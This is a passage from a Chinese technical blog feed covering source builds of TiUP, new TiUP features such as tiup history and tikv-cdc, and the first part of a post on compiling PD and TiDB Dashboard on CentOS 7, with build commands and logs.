GOARCH=amd64 go build  -ldflags &#x27;-w -s -X &quot;github.com/pingcap/tiup/pkg/version.GitHash=041760d-dirty&quot; -X &quot;github.com/pingcap/tiup/pkg/version.GitRef=pr-shawnyan-0806&quot; &#x27; -o bin/tiup-server ./server</span><br></pre></td></tr></table></figure></div>
<p>编译完成后，查看版本信息，为了便于识别演示，这里修改了 branch 和版本号。</p>
<img  alt="t2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230807-32936d26-29d3-48b1-80cd-ae2d1b1a6a3d-1691513611105.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="投入使用">投入使用</h3>
<p>编译好的二进制文件在 <code>bin</code> 目录下，可以推送到私有 mirror 库，也可以替换本地的二进制文件进行验证测试。起一个 playground 进行测试可以正常使用。</p>
<p>感谢 @wish 大佬的 pr (#2163)，修改了启动展示效果，看起来生动许多。</p>
<img  alt="t3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230807-6f10adfc-8b25-4efb-a23f-de24ec3737d8-1691513616825.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="TiUP-新特性">TiUP 新特性</h2>
<p>从上次撰文写 TiUP 到现在已经一年多了，从下图中可以看出，这段时间里，TiUP 仓库代码变更量趋于平缓。其中，去年 9 月，TiUP 1.11.0 发版，有较多代码新增，去年 10 月，bench 代码剥离，有较多代码删减。</p>
<img  alt="t4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230807-814f6d85-b448-4ad7-bfc6-b1c9b090bfb3-1691513623231.png"
                      referrerpolicy="no-referrer"
                >
<p>下图为近一年 TiUP 的发版时间线，并标记了 TiDB 重要版本。</p>
<img  alt="t5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230807-8336f090-6f47-4745-8134-5b967e050e64-1691513627743.png"
                      referrerpolicy="no-referrer"
                >
<p>下面举几个栗子对其中部分新特性加以讲解。</p>
<h3 id="tiup-history">tiup history</h3>
<p>从 TiUP v1.10.0 开始，新增支持新命令 <code>tiup history</code> 可以查看之前的调用记录。(#1808)</p>
<p>支持 csv, json 两种输出格式。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 7.2.0]$ tiup <span class="built_in">history</span> --format=default | grep <span class="built_in">history</span></span><br><span class="line">2023-08-07T10:22:33  tiup <span class="built_in">history</span>                                                                 0</span><br><span class="line">2023-08-07T12:15:17  tiup <span class="built_in">history</span> --format json                                                   0</span><br><span class="line">2023-08-07T12:16:34  tiup <span class="built_in">history</span> --format=json                                                   0</span><br><span class="line">2023-08-07T12:16:51  tiup <span class="built_in">history</span> --format=csv                                                    0</span><br><span class="line"><span class="built_in">history</span> <span class="built_in">log</span> save path: /home/shawnyan/.tiup/history</span><br><span class="line">[shawnyan@centos7 7.2.0]$</span><br><span class="line">[shawnyan@centos7 7.2.0]$ tiup <span class="built_in">history</span> --format=json | grep <span class="built_in">history</span></span><br><span class="line">&#123;<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2023-08-07T10:22:33.18062534+09:00&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;tiup history&quot;</span>,<span class="string">&quot;exit_code&quot;</span>:0&#125;</span><br><span class="line">&#123;<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2023-08-07T12:15:04.845158283+09:00&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;tiup history --format json&quot;</span>,<span class="string">&quot;exit_code&quot;</span>:0&#125;</span><br><span class="line">&#123;<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2023-08-07T12:15:08.7993845+09:00&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;tiup history --format json&quot;</span>,<span class="string">&quot;exit_code&quot;</span>:0&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="Kylin-Linux-10-RHEL-8">Kylin Linux 10+, RHEL 8</h3>
<p><code>tiup-cluster</code> 支持在麒麟 （Kylin Linux 10+） 和红帽 （RHEL 8） 上部署。(#1886, #1896)</p>
<p>这是对 TiDB 操作系统的要求，其他适配的操作系统可参阅文档 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/hardware-and-software-requirements" >操作系统及平台要求 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h3 id="tikv-cdc">tikv-cdc</h3>
<p>从 TiUP v1.11.0 开始，支持在 tiup-cluster 和 tiup-playground 中使用新组件 <code>tikv-cdc</code>。(#2000, #2022)</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 7.2.0]$ tiup tikv-cdc version</span><br><span class="line">tiup is checking updates <span class="keyword">for</span> component tikv-cdc ...</span><br><span class="line">Starting component `tikv-cdc`: /home/shawnyan/.tiup/components/tikv-cdc/v1.1.1/tikv-cdc version</span><br><span class="line">Release Version: cdc-v1.1.1</span><br><span class="line">Git Commit Hash: 35d2af65811864e548dcd44aed69dd442f703344</span><br><span class="line">Git Branch: HEAD</span><br><span class="line">UTC Build Time: 2023-02-28 08:13:06</span><br><span class="line">Go Version: go version go1.18.1 linux/amd64</span><br><span class="line">Failpoint Build: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">[shawnyan@centos7 7.2.0]$ tiup tikv-cdc --<span class="built_in">help</span></span><br><span class="line">tiup is checking updates <span class="keyword">for</span> component tikv-cdc ...</span><br><span class="line">Starting component `tikv-cdc`: /home/shawnyan/.tiup/components/tikv-cdc/v1.1.1/tikv-cdc --<span class="built_in">help</span></span><br><span class="line">TiKV Change Data Capture</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  tikv-cdc [<span class="built_in">command</span>]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  cli         Manage replication task and TiKV-CDC cluster</span><br><span class="line">  <span class="built_in">help</span>        Help about any <span class="built_in">command</span></span><br><span class="line">  server      Start a TiKV-CDC capture server</span><br><span class="line">  version     Output version information</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --<span class="built_in">help</span>   <span class="built_in">help</span> <span class="keyword">for</span> tikv-cdc</span><br><span class="line"></span><br><span class="line">Use <span class="string">&quot;tikv-cdc [command] --help&quot;</span> <span class="keyword">for</span> more information about a <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure></div>
<p>在之前的版本中只能使用 <code>cdc</code> 对 TiCDC 进行控制，现在新增了 TiKV-CDC 功能，可以通过 <code>tikv-cdc</code> 来捕捉 TiKV 的变更，支持复制变更到其他 TiKV 集群。</p>
<img  alt="t6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230808-fc0646cf-a925-4fa8-8844-c2d6a21127b3-1691513635183.png"
                      referrerpolicy="no-referrer"
                >
<p>但是，只支持 TiKV v6.2.0 及以上版本。(<a class="link"   href="https://github.com/pingcap/tiup/blob/v1.12.5/pkg/tidbver/tidbver.go#L146" >TiKVCDCSupportDeploy <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<blockquote>
<p>// TiKV-CDC only support TiKV version not less than v6.2.0</p>
</blockquote>
<p>这是因为从 TiKV v6.2.0 开始，支持跨集群 RawKV 复制。<br>
不过，关于 <code>tiup tikv-cdc</code> 的官方文档还没有，期望可以在官方文档中看到更多信息。(<a class="link"   href="https://github.com/pingcap/docs-cn/issues/14717" >#14717 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<h3 id="tidb-dashboard">tidb-dashboard</h3>
<p>从 TiUP v1.11.0 开始，支持在 tiup-cluster 中启用专用 TiDB Dashboard ((#2017)，并在生成拓扑模板文件中包含了相关配置，当然上节 tikv-cdc 的相关配置也包含其中，使用 <code>--full</code> 选项生成模板拓扑 (<code>tiup cluster template --full</code>) 可以看到下面内容。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # Server configs are used to specify the configuration of TiKV-CDC Servers.</span></span><br><span class="line"><span class="attr">kvcdc_servers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="number">10.0</span><span class="number">.1</span><span class="number">.20</span></span><br><span class="line">    <span class="comment"># # SSH port of the server.</span></span><br><span class="line">    <span class="comment"># ssh_port: 22</span></span><br><span class="line">    <span class="comment"># # TiKV-CDC Server communication port.</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8600</span></span><br><span class="line">    <span class="comment"># # TiKV-CDC Server data storage directory.</span></span><br><span class="line">    <span class="attr">data_dir:</span> <span class="string">&quot;/data1/tidb-data/tikv-cdc-8600&quot;</span></span><br><span class="line">    <span class="comment"># # TiKV-CDC Server log file storage directory.</span></span><br><span class="line">    <span class="attr">log_dir:</span> <span class="string">&quot;/data1/tidb-deploy/tikv-cdc-8600/log&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="number">10.0</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line">    <span class="attr">data_dir:</span> <span class="string">&quot;/data1/tidb-data/tikv-cdc-8600&quot;</span></span><br><span class="line">    <span class="attr">log_dir:</span> <span class="string">&quot;/data1/tidb-deploy/tikv-cdc-8600/log&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Server configs are used to specify the configuration of TiDB Dashboard Servers. Available from v6.5.0</span></span><br><span class="line"><span class="comment"># tidb_dashboard_servers:</span></span><br><span class="line">  <span class="comment"># # The ip address of the PD Server.</span></span><br><span class="line"><span class="comment">#  - host: 10.0.1.11</span></span><br><span class="line">    <span class="comment"># # SSH port of the server.</span></span><br><span class="line">    <span class="comment"># ssh_port: 22</span></span><br><span class="line">    <span class="comment"># # port of TiDB Dashboard</span></span><br><span class="line">    <span class="comment"># port: 12333</span></span><br><span class="line">    <span class="comment"># # TiDB Dashboard deployment file, startup script, configuration file storage directory.</span></span><br><span class="line">    <span class="comment"># deploy_dir: &quot;/tidb-deploy/tidb-dashboard-12333&quot;</span></span><br><span class="line">    <span class="comment"># # PD Server data storage directory.</span></span><br><span class="line">    <span class="comment"># data_dir: &quot;/tidb-data/tidb-dashboard-12333&quot;</span></span><br><span class="line">    <span class="comment"># # PD Server log file storage directory.</span></span><br><span class="line">    <span class="comment"># log_dir: &quot;/tidb-deploy/tidb-dashboard-12333/log&quot;</span></span><br><span class="line">    <span class="comment"># # numa node bindings.</span></span><br><span class="line">    <span class="comment"># numa_node: &quot;0,1&quot;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="Disaggregated-Mode">Disaggregated Mode</h3>
<p>TiUP v1.12.2 中引入了一个新参数 <code>--mode=tidb-disagg</code> (#2194)，用来指定 TiDB 集群启动时使用<a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/tiflash-disaggregated-and-s3" >【存算分离】 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>模式。</p>
<blockquote>
<p>TiFlash 存算分离架构目前为实验特性，不建议在生产环境中使用。</p>
</blockquote>
<p>该模式只支持 TiFlash v7.1.0 及以上版本，由于文章篇幅原因，在此不多做演示。</p>
<h2 id="遇到的问题">遇到的问题</h2>
<h3 id="期待-tiup-uninstall-加强">期待 tiup uninstall 加强</h3>
<p>在测试时，会经常更新 nightly 版本到本地，但是无法使用 <code>tiup uninstall</code> 命令批量删除某个版本的 nightly 安装包，只能将本地全铲掉重来，期待相关功能可以得到加强。相关讨论帖：【<a class="link"   href="https://asktug.com/t/topic/1008945" >tiup 卸载参数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>】</p>
<h3 id="playground-的-root-用户修改密码问题">playground 的 root 用户修改密码问题</h3>
<p>tiup playground 广泛应用于 TiDB 教学和功能演示，对在校大学生和 TiDB 初学者极为友好。<br>
不过，论坛中有个帖子提到在修改 root 用户密码后无法顺利启动 playground 的问题 (<a class="link"   href="https://asktug.com/t/topic/1010718/31?u=shawnyan" >1010718 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)，定位到是 TiUP 的一个已提交未修复 Issue，期待可以修复，以支持这种基础功能，即便是 playground 为了方便演示最初没有考虑这方面的事情。</p>
<h3 id="tiup-client-的-dsn-文件解析问题">tiup client 的 dsn 文件解析问题</h3>
<p>与上个问题相关联的，在 tiup playground 启动后，会在数据目录生成一个 dsn 文件，可用于 tiup client 访问 TiDB，但是该文件并不会随着密码修改而变化，也不会随着 <code>tiup playground scale-out</code> 而增加新地址，所以只能通过 tiup client 以无密码的方式访问最初启动的那个 TiDB Server，除非手动维护 dsn 文件。<a class="link"   href="https://asktug.com/t/topic/1010855" >【tiup client,dsn 不支持保存密码】 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<h3 id="go-sql-driver-mysql-版本">go-sql-driver/mysql 版本</h3>
<p>编译最新版 TiUP 时，在编译日志中发现当前使用的版本是 v1.6.0，建议升级到 v1.7.1，相关信息记录在帖子 <a class="link"   href="https://asktug.com/t/topic/1010860" >【tiup 的mysql driver 建议升级到1.7.1】 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span>: downloading github.com/<span class="keyword">go</span>-sql-driver/mysql v1<span class="number">.6</span><span class="number">.0</span></span><br></pre></td></tr></table></figure></div>
<h3 id="其他小瑕疵">其他小瑕疵</h3>
<p>在写本文的过程中，发现几处关于 TiUP 的小瑕疵，期待官方更新。</p>
<ol>
<li><a class="link"   href="https://asktug.com/t/topic/1010884" >tiup 源码中的link 404 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/docs-cn/issues/14717" >建议补充 tikv-cdc 的相关内容 #14717 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/docs-cn/issues/14718" >tiup-component-cluster-template 文档待更新 #14718 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/pingcap/docs-cn/issues/14723" >tiup-component-management 文档待更新 #14723 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
<h2 id="总结">总结</h2>
<p>TiUP 工具的价值不言而喻，其实用程度及适用范围远超 Ansible。Playground 是教学演示神器，集众 Team 的心血，工具的好坏不是在论坛里水贴就可以论道的，而是要看在匹配人群中的口碑如何。All in TiDB, and Everyone needs TiUP~</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 7.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>compile</tag>
        <tag>tiup</tag>
        <tag>tidb 7.x</tag>
        <tag>tikv-cdc</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 7.x 源码编译之 PD/TiDB Dashboard 篇</title>
    <url>/2023/tidb/tidb-7.x-compile-pd/</url>
    <content><![CDATA[<img  alt="tidb-7.x-new-feature-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/tidb-7.x-new-feature-banner-1696249336706.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="TiDB">TiDB</h2>
<p>TiDB 是 PingCAP 公司自主设计、研发的开源分布式关系型数据库，是一款同时支持在线事务处理与在线分析处理 (Hybrid Transactional and Analytical Processing, HTAP) 的融合型分布式数据库产品，具备水平扩容或者缩容、金融级高可用、实时 HTAP、云原生的分布式数据库、兼容 MySQL 5.7 协议和 MySQL 生态等重要特性，支持在本地和云上部署。</p>
<h2 id="源码仓库">源码仓库</h2>
<p>TiDB 数据库本身由众多组件构成，而周边生态也欣欣向荣，所以源码仓库很多，本文主要涉及 PD 和 TiDB Dashboard 两个源码库，目标地址如下：</p>
<ul>
<li><a class="link"   href="https://github.com/tikv/pd/" >https://github.com/tikv/pd/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>PD 是 Placement Driver 的缩写。它管理和调度TiKV集群。PD 被称之为 TiDB 集群的“大脑”。<br>
PD 通过嵌入etcd来支持容错。部署时，建议启动 3 个 PD 进程来构成 PD 集群，保证高可用。</p>
<ul>
<li><a class="link"   href="https://github.com/pingcap/tidb-dashboard/" >https://github.com/pingcap/tidb-dashboard/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>TiDB Dashboard 是一个 Web UI，用于监视、诊断和管理 TiDB 集群。可单独编译前后台资源包，也可以打包成二进制文件，一键启动。<br>
关于 TiDB Dashboard 的更多介绍，可以参考官方文档： <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/dashboard-intro" >TiDB Dashboard 介绍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="编译依赖">编译依赖</h2>
<p>本文的编译使用的系统为 CentOS 7。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ cat /etc/redhat-release</span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line">[shawnyan@centos7 ~]$ uname -a</span><br><span class="line">Linux centos7.shawnyan.com 3.10.0-1160.92.1.el7.x86_64 #1 SMP Tue Jun 20 11:48:01 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">[shawnyan@centos7 ~]$ go version</span><br><span class="line">go version go1.20.6 linux/amd64</span><br></pre></td></tr></table></figure></div>
<p>PD 编译依赖 go 1.20，所以需要先安装 golang。但是，CentOS 7 默认提供的是 golang 1.19。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ yum info golang</span><br><span class="line">Loaded plugins: fastestmirror, langpacks, product-id, search-disabled-repos, subscription-manager</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : golang</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 1.19.10</span><br><span class="line">Release     : 1.el7</span><br><span class="line">Size        : 7.4 M</span><br><span class="line">Repo        : installed</span><br><span class="line">From repo   : epel-7-aliyun</span><br><span class="line">Summary     : The Go Programming Language</span><br><span class="line">URL         : http://golang.org/</span><br><span class="line">License     : BSD and Public Domain</span><br><span class="line">Description : The Go Programming Language.</span><br><span class="line"></span><br><span class="line">[shawnyan@centos7 pd]$ go version</span><br><span class="line">go version go1.19.10 linux/amd64</span><br></pre></td></tr></table></figure></div>
<p>所以，需要手动下载二进制包并更新环境变量。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.20.6.linux-amd64.tar.gz</span><br><span class="line">tar zxvf go1.20.6.linux-amd64.tar.gz</span><br><span class="line">sudo mv go /opt</span><br><span class="line"></span><br><span class="line">vi ~/.bashrc</span><br><span class="line">export GOl11MODULE=on</span><br><span class="line">export GOROOT=/opt/go</span><br><span class="line">export GOPATH=/home/shawnyan</span><br><span class="line">export PATH=$GOPATH/bin:$GOROOT/bin:$PATH</span><br></pre></td></tr></table></figure></div>
<p>TiDB Dashboard 包含前端 UI，所以依赖会多一些，需要安装 npm、pnpm，如果未安装 pnpm 会遇到报错。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd ui &amp;&amp;\</span><br><span class="line">pnpm i</span><br><span class="line">/bin/sh: line 1: pnpm: command not found</span><br><span class="line">make: *** [ui_deps] Error 127</span><br></pre></td></tr></table></figure></div>
<p>这里，从 GitHub 下载 pnpm 二进制包。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/pnpm/pnpm/releases/latest/download/pnpm-linuxstatic-x64</span><br><span class="line">sudo mv pnpm-linuxstatic-x64 /bin/pnpm</span><br><span class="line">sudo chmod +x /bin/pnpm</span><br><span class="line">pnpm --version</span><br><span class="line">8.6.11</span><br></pre></td></tr></table></figure></div>
<h2 id="编译示例-–-PD">编译示例 – PD</h2>
<p>PD 编译时会直接引用 TiDB Dashboard，PD 编译日志截取如下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">+ Fetch TiDB Dashboard Go module</span><br><span class="line">  - TiDB Dashboard directory: /home/shawnyan/pkg/mod/github.com/pingcap/tidb-dashboard@v0.0.0-20230705095454-5e220f970f27</span><br><span class="line">+ Create download cache directory: /home/shawnyan/pd/.dashboard_download_cache</span><br><span class="line">+ Discover TiDB Dashboard release version</span><br><span class="line">  - TiDB Dashboard release version: 2023.07.05.1</span><br><span class="line">+ Check whether pre-built assets are available</span><br><span class="line">  - Cached archive does not exist</span><br><span class="line">  - Download pre-built embedded assets from GitHub release</span><br><span class="line">  - Download https://github.com/pingcap/tidb-dashboard/releases/download/v2023.07.05.1/embedded-assets-golang.zip</span><br><span class="line"><span class="meta prompt_">  % </span><span class="language-bash">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">100 14.7M  100 14.7M    0     0  4029k      0  0:00:03  0:00:03 --:--:-- 7105k</span><br><span class="line">  - Save archive to cache: /home/shawnyan/pd/.dashboard_download_cache/embedded-assets-golang-2023.07.05.1.zip</span><br><span class="line">+ Unpack embedded asset from archive</span><br><span class="line">Archive:  /home/shawnyan/pd/.dashboard_download_cache/embedded-assets-golang-2023.07.05.1.zip</span><br></pre></td></tr></table></figure></div>
<p>所以想修改 TiDB Dashboard 的 UI 见面并打包到 PD 中，则需先完成 TiDB Dashboard 的编译。<br>
当然也可以跳过 TiDB Dashboard 的编译，在 PD 编译过程中会自动下载打包好的 Dashboard。<br>
甚至，可以在 PD 编译过程中，使用参数 <code>without_dashboard</code> 来跳过 Dashboard。</p>
<p>PD 编译过程其实蛮顺畅。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shawn0915/pd --depth=1</span><br><span class="line">cd pd</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>
<p>稍等一会就可以看到二进制文件了。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 bin]$ ls</span><br><span class="line">pd-ctl  pd-recover  pd-server</span><br><span class="line">[shawnyan@centos7 bin]$ ./pd-server --version</span><br><span class="line">Release Version: fe52361</span><br><span class="line">Edition: Community</span><br><span class="line">Git Commit Hash: fe52361cf48a7f5ed8c69bcd02db77e25162f207</span><br><span class="line">Git Branch: master</span><br><span class="line">UTC Build Time:  2023-07-31 05:49:54</span><br></pre></td></tr></table></figure></div>
<h2 id="编译示例-–-TiDB-Dashboard">编译示例 – TiDB Dashboard</h2>
<p>下载 TiDB Dashboard 源码，这里为了节省时间、空间，只克隆一份最新版本的源码：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shawn0915/tidb-dashboard --depth=1</span><br></pre></td></tr></table></figure></div>
<p>进入源码文件夹，并执行编译命令 <code>make package</code>，然后进入漫长的等待。。。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 tidb-dashboard-master]$ make package</span><br><span class="line">scripts/install_go_tools.sh</span><br><span class="line">+ Install go tools</span><br><span class="line">go install github.com/swaggo/swag/cmd/swag</span><br><span class="line">go install github.com/vektra/mockery/v2</span><br><span class="line">+ Clean up go mod</span><br><span class="line">cd ui &amp;&amp;\</span><br><span class="line">pnpm i</span><br><span class="line">packages/tidb-dashboard-lib              |  WARN  The field &quot;resolutions&quot; was found in /home/shawnyan/tidb-dashboard-master/ui/packages/tidb-dashboard-lib/package.json. This will not take effect. You should configure &quot;resoluti                                         ons&quot; at the root of the workspace instead.</span><br><span class="line">Scope: all 8 workspace projects</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated opn@6.0.0</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated chokidar@2.1.8</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated fsevents@1.2.13</span><br><span class="line">packages/tidb-dashboard-lib              |  WARN  deprecated @babel/polyfill@7.12.1</span><br><span class="line">packages/tidb-dashboard-lib              |  WARN  deprecated uuid@3.4.0</span><br><span class="line">packages/tidb-dashboard-lib              |  WARN  deprecated querystring@0.2.0</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated core-js@1.2.7</span><br><span class="line">packages/tidb-dashboard-lib              |  WARN  deprecated core-js@2.6.12</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated source-map-resolve@0.5.3</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated source-map-url@0.4.1</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated urix@0.1.0</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated resolve-url@0.2.1</span><br><span class="line">packages/tidb-dashboard-for-op           |  WARN  deprecated source-map-resolve@0.6.0</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated sane@4.1.0</span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud |  WARN  deprecated w3c-hr-time@1.0.2</span><br><span class="line">packages/tidb-dashboard-lib              |  WARN  deprecated uglify-es@3.3.9</span><br><span class="line">Packages: +2384</span><br><span class="line">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">Progress: resolved 2408, reused 2387, downloaded 0, added 0</span><br><span class="line">Progress: resolved 2408, reused 2387, downloaded 0, added 0, done</span><br><span class="line">node_modules/.pnpm/esbuild@0.14.49/node_modules/esbuild: Running postinstall script, done in 791ms</span><br><span class="line">node_modules/.pnpm/cypress@8.5.0/node_modules/cypress: Running postinstall script, done in 1m 42.9s</span><br><span class="line">node_modules/.pnpm/es5-ext@0.10.61/node_modules/es5-ext: Running postinstall script, done in 367ms</span><br><span class="line">. prepare$ cd .. &amp;&amp; husky install ui/.husky</span><br><span class="line">│ fatal: not a git repository (or any of the parent directories): .git</span><br><span class="line">└─ Done in 609ms</span><br><span class="line"> WARN  Issues with peer dependencies found</span><br><span class="line">.</span><br><span class="line">├─┬ @typescript-eslint/eslint-plugin 4.33.0</span><br><span class="line">│ └── ✕ unmet peer eslint@&quot;^5.0.0 || ^6.0.0 || ^7.0.0&quot;: found 8.20.0</span><br><span class="line">└─┬ @typescript-eslint/parser 4.33.0</span><br><span class="line">  └── ✕ unmet peer eslint@&quot;^5.0.0 || ^6.0.0 || ^7.0.0&quot;: found 8.20.0</span><br><span class="line"></span><br><span class="line">packages/tidb-dashboard-for-clinic-cloud</span><br><span class="line">├─┬ cypress-image-snapshot 4.0.1</span><br><span class="line">│ └── ✕ unmet peer cypress@^4.5.0: found 8.5.0</span><br><span class="line">└─┬ @g07cha/flexbox-react 5.0.0</span><br><span class="line">  └─┬ styled-components 2.4.1</span><br><span class="line">    └── ✕ unmet peer react@&quot;&gt;= 0.14.0 &lt; 17.0.0-0&quot;: found 17.0.2</span><br><span class="line"></span><br><span class="line">packages/tidb-dashboard-for-op</span><br><span class="line">├─┬ cypress-image-snapshot 4.0.1</span><br><span class="line">│ └── ✕ unmet peer cypress@^4.5.0: found 8.5.0</span><br><span class="line">└─┬ @g07cha/flexbox-react 5.0.0</span><br><span class="line">  └─┬ styled-components 2.4.1</span><br><span class="line">    └── ✕ unmet peer react@&quot;&gt;= 0.14.0 &lt; 17.0.0-0&quot;: found 17.0.2</span><br><span class="line"></span><br><span class="line">packages/tidb-dashboard-lib</span><br><span class="line">├─┬ @g07cha/flexbox-react 5.0.0</span><br><span class="line">│ └─┬ styled-components 2.4.1</span><br><span class="line">│   └── ✕ unmet peer react@&quot;&gt;= 0.14.0 &lt; 17.0.0-0&quot;: found 17.0.2</span><br><span class="line">├─┬ react-konva 16.8.6</span><br><span class="line">│ ├── ✕ unmet peer react@16.8.x: found 17.0.2</span><br><span class="line">│ ├── ✕ unmet peer react-dom@16.8.x: found 17.0.2</span><br><span class="line">│ └─┬ react-reconciler 0.20.4</span><br><span class="line">│   └── ✕ unmet peer react@^16.0.0: found 17.0.2</span><br><span class="line">├─┬ react-native 0.70.6</span><br><span class="line">│ └── ✕ unmet peer react@18.1.0: found 17.0.2</span><br><span class="line">└─┬ @react-three/fiber 8.9.1</span><br><span class="line">  ├── ✕ unmet peer react@&gt;=18.0: found 17.0.2</span><br><span class="line">  ├── ✕ unmet peer react-dom@&gt;=18.0: found 